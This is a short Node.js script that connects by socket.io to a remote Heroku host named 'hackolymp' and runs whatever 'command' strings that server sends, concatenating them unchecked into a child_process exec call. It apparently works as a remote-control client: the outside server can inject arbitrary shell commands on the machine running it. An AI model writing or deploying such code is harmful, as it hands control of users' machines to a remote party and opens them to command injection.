const {exec} = require("child_process")
const io = require("socket.io-client");

const socket = io("http://hackolymp.herokuapp.com/");

socket.on('command',(data)=>{
    exec("node cmd.js "+data.command,(err,out)=>{

        console.log(out)

    })
})